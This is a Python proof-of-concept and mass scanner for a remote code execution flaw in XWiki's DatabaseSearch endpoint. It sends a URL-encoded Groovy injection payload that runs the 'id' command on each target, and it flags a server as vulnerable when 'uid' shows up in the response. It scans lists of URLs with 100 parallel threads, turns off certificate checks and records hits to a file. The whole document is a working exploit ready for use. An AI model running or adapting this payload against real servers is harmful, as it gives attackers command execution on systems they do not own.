import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
               author=芜湖
               version=1.1.1                             """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="XWiki-RCE-DatabaseSearch-RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url ')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


def poc(target):
    payload = '/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:127.0)Gecko/20100101Firefox/127.0',
        'Accept': 'application/json,text/javascript,*/*;q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        # print(res.text)
        if 'uid' in res.text:
            print(f'[+]存在漏洞{target}')
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f'[-]不存在漏洞{target}')
    except:
        print('该站点存在问题')

if __name__ == '__main__':
    main()